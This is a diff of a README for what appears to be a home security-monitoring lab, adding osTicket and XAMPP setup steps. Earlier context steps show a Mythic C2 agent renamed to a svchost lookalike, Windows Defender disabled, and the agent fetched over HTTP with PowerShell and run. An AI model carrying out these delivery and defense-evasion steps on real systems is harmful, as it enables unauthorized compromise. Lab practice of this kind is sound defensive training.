@@ -86,3 +86,7 @@ Configuration Management Tools: To automate the deployment and configuration of 
 15. In the Mythic VM cd into home directory > wget <link address>; change 8443 to 744. and ip to the mythic vm ip nad --no-check-certificate > mv <file> svchost-<make a filename>.exe < python3 -m http.server 9999
 16. Disable Windows Defender on the Windows Server and add an exclusion for the Downloads Folder. In PowerShell invoke-webrequest -uri http://<mythic vm ip address>:9999/svchost-<filename>.exe -Outfile "(:\Users\Administrator\Downloads\svchost-<filename>.exe" > run the file thats in downloads.
 17. Spin up your osTicket VM. Download <a href="https://www.apachefriends.org/download.html">xampp</a> by apache and <a href="https://osticket.com/">osTicket</a>. Click on xampp to install it. Extract all of the osTicket download after you extract the osticket zip in that folder.
+![osTicket download](https://github.com/user-attachments/assets/2f9da10e-cc8d-4779-8662-51d54f098e22)<br>
+*Ref 22: osTicket download*<br>
+18. Navigate to xampp folder, find properties and edit it to change the Domain name to the VMs ip address, do the same to mysqlhost.
+19. Open xampp control panel and start apache and mysql, click admin nnext to apache > phpMyAdmin > New, to create a new database > name it > create > home > user accounts > click "root" mext to "localhost" > change password > enter password, click go > login information, under host select "use text field", enter the osTicket VM ip address, enter a password > Go.
